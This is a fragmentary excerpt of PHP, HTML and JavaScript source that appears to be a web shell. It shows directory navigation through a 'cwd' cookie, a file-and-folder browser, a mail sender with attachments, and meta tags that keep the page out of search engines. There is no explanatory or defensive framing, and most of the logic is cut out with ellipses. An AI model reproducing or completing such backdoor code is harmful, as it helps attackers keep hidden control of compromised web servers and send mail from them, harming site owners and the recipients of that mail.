...
if(isset($p['cd'])){
	...
	if(is_dir($path)){
		...
		setcookie("cwd", $path);
		$res = $path."{[|nono|]}".get_nav($path)."{[|nono|]}";
...
if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($p['mailContent'])){
	...
	$mailAttachment = (!empty($mailAttachment))? explode("{[|nono|]}", $p['mailAttachment']):array();
...
<meta name='robots' content='noindex, nofollow, noarchive'>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
<link rel='SHORTCUT ICON' href='<?php echo get_resource('nono');?>'>
<style type="text/css">
@font-face {
...
<div id='wrapper'>
	...
	<div id='header'>
		...
		<div id='headerNav'>
			...
			<img onclick='viewfileorfolder();' id='nono' src='<?php echo get_resource('nono');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>
...
function mail_send(){
	...
	mailAttachment = '';
	if($('.mailAttachment')){
		mailAttachment = $('.mailAttachment').map(function(){ return this.value; }).get().join('{[|nono|]}');
	}
